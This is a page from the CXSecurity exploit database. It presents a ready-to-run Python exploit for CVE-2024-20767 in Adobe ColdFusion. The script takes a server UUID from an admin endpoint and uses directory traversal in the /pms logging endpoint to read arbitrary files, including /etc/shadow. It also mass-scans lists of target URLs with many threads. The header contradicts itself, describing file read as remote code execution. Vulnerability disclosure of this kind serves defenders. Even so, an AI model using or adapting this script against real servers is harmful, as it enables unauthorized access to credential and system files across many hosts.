---
title: Adobe ColdFusion 2023.6 Remote File Read
url: https://cxsecurity.com/issue/WLB-2025070036
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-07-29
fetch_date: 2025-10-06T23:16:38.237768
---

# Adobe ColdFusion 2023.6 Remote File Read

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Adobe ColdFusion 2023.6 Remote File Read** **2025.07.28**  Credit:  **[@İbrahimsql](https://cxsecurity.com/author/%40%C4%B0brahimsql/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-20767](https://cxsecurity.com/cveshow/CVE-2024-20767/ "Click to see CVE-2024-20767")**  CWE: **[CWE-284](https://cxsecurity.com/cwe/CWE-284 "CWE-284")** | |

# Exploit Title: Adobe ColdFusion 2023.6 - Remote File Read
# Exploit Author: @İbrahimsql
# Exploit Author's github: https://github.com/ibrahmsql
# Description: ColdFusion 2023 (LUcee) - Remote Code Execution
# CVE: CVE-2024-20767
# Vendor Homepage: https://www.adobe.com/
# Requirements: requests>=2.25.0, urllib3>=1.26.0
# Usage: python3 CVE-2024-20767.py -u http://target.com -f /etc/passwd
#!/usr/bin/env python3
# -\*- coding: utf-8 -\*-
import os
import re
import urllib3
import requests
import argparse
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as\_completed
urllib3.disable\_warnings()
class ColdFusionExploit:
def \_\_init\_\_(self, output\_file=None, port=8500):
self.output\_file = output\_file
self.port = port
self.verbose = True
self.session = requests.Session()
def print\_status(self, message, status="\*"):
colors = {"+": "\033[92m", "-": "\033[91m", "\*": "\033[94m", "!": "\033[93m"}
reset = "\033[0m"
print(f"{colors.get(status, '')}{status} {message}{reset}")
def normalize\_url(self, url):
if not url.startswith(('http://', 'https://')):
url = f"http://{url}"
parsed = urlparse(url)
if not parsed.port:
url = f"{url}:{self.port}"
return url.rstrip('/')
def get\_uuid(self, url):
endpoint = "/CFIDE/adminapi/\_servermanager/servermanager.cfc?method=getHeartBeat"
try:
response = self.session.get(f"{url}{endpoint}", verify=False, timeout=10)
if response.status\_code == 200:
match = re.search(r"<var name='uuid'><string>(.+?)</string></var>", response.text)
if match:
uuid = match.group(1)
if self.verbose:
self.print\_status(f"UUID: {uuid[:8]}...", "+")
return uuid
except Exception as e:
if self.verbose:
self.print\_status(f"Error: {e}", "-")
return None
def read\_file(self, url, uuid, file\_path):
headers = {"uuid": uuid}
endpoint = f"/pms?module=logging&file\_name=../../../../../../../{file\_path}&number\_of\_lines=100"
try:
response = self.session.get(f"{url}{endpoint}", verify=False, headers=headers, timeout=10)
if response.status\_code == 200 and response.text.strip() != "[]":
return response.text
except:
pass
return None
def test\_files(self, url, uuid):
files = {
"Linux": ["etc/passwd", "etc/shadow", "etc/hosts"],
"Windows": ["Windows/win.ini", "Windows/System32/drivers/etc/hosts", "boot.ini"]
}
for os\_name, file\_list in files.items():
for file\_path in file\_list:
content = self.read\_file(url, uuid, file\_path)
if content:
self.print\_status(f"VULNERABLE: {url} - {os\_name} - {file\_path}", "+")
if self.verbose:
print(content[:200] + "..." if len(content) > 200 else content)
print("-" \* 50)
if self.output\_file:
with open(self.output\_file, "a") as f:
f.write(f"{url} - {os\_name} - {file\_path}\n")
return True
return False
def exploit\_custom\_file(self, url, uuid, custom\_file):
content = self.read\_file(url, uuid, custom\_file)
if content:
self.print\_status(f"File read: {custom\_file}", "+")
print(content)
return True
else:
self.print\_status(f"Failed to read: {custom\_file}", "-")
return False
def exploit(self, url, custom\_file=None):
url = self.normalize\_url(url)
if self.verbose:
self.print\_status(f"Testing: {url}")
uuid = self.get\_uuid(url)
if not uuid:
if self.verbose:
self.print\_status(f"No UUID: {url}", "-")
return False
if custom\_file:
return self.exploit\_custom\_file(url, uuid, custom\_file)
else:
return self.test\_files(url, uuid)
def scan\_file(self, target\_file, threads):
if not os.path.exists(target\_file):
self.print\_status(f"File not found: {target\_file}", "-")
return
with open(target\_file, "r") as f:
urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
self.print\_status(f"Scanning {len(urls)} targets with {threads} threads")
self.verbose = False
vulnerable = 0
with ThreadPoolExecutor(max\_workers=threads) as executor:
futures = {executor.submit(self.exploit, url): url for url in urls}
for future in as\_completed(futures):
url = futures[future]
try:
if future.result():
vulnerable += 1
print(f"[+] {url}")
else:
print(f"[-] {url}")
except Exception as e:
print(f"[!] {url} - Error: {e}")
self.print\_status(f"Scan complete: {vulnerable}/{len(urls)} vulnerable", "+")
def main():
parser = argparse.ArgumentParser(description="ColdFusion CVE-2024-20767 Exploit")
parser.add\_argument("-u", "--url", help="Target URL")
parser.add\_argument("-f", "--file", help="File with target URLs")
parser.add\_argument("-p", "--port", type=int, default=8500, help="Port (default: 8500)")
parser.add\_argument("-c", "--custom", help="Custom file to read")
parser.add\_argument("-o", "--output", help="Output file")
parser.add\_argument("-t", "--threads", type=int, default=20, help="Threads (default: 20)")
parser.add\_argument("-q", "--quiet", action="store\_true", help="Quiet mode")
args = parser.parse\_args()
if not args.url and not args.file:
parser.print\_help()
return
exploit = ColdFusionExploit(args.output, args.port)
exploit.verbose = not args.quiet
if args.url:
exploit.exploit(args.url, args.custom)
elif args.file:
exploit.scan\_file(args.file, args.threads)
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025070036)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top